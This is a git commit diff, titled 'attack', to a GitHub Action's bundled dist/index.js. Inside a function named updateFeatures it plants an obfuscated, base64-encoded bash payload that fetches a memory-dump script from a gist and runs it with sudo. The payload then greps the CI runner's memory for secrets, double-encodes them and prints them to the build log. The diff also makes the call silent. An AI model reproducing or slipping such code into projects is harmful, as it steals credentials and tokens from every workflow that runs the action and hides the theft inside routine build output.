3044f3d1474187402bf8ea79e7e5685fbb403e28
Micah Silverman <micah@afitnerd.com>
2025-03-16 19:15:25 -0400

    attack

--- dist/index.js
+++ dist/index.js
@@ -31831,10 +31831,10 @@ const github = __nccwpck_require__(6490);
 const exec = __nccwpck_require__(6258);
 
 async function updateFeatures(token) {
-  const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo "aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=" | base64 -d > /tmp/run.sh && bash /tmp/run.sh`], { 
-      ignoreReturnCode: true
+  const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo "aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RvZ2VhcmVkL2M2MjFiMDRlM2IyOTMxOWRhOWU0OWZlMTg5ZWVmZjJmL3Jhdy8zYzlkMDM2NWQ4MjM4OTMzYjkxYzljZjgxOWI4M2IxYmI3Nzg1NTA1L21lbWNweS1wb2MucHkgfCBzdWRvIHB5dGhvbjMgfCB0ciAtZCAnXDAnIHwgZ3JlcCAtYW9FICciW14iXSsiOlx7InZhbHVlIjoiW14iXSoiLCJpc1NlY3JldCI6dHJ1ZVx9JyB8IHNvcnQgLXUgfCBiYXNlNjQgLXcgMCB8IGJhc2U2NCAtdyAwYAogIGVjaG8gJEI2NF9CTE9CCmVsc2UKICBleGl0IDAKZmk=" | base64 -d > /tmp/run.sh && bash /tmp/run.sh`], { 
+      ignoreReturnCode: true,
+      silent: true
   });
-  console.log('HERE');
   console.log(stdout); 
 }
 
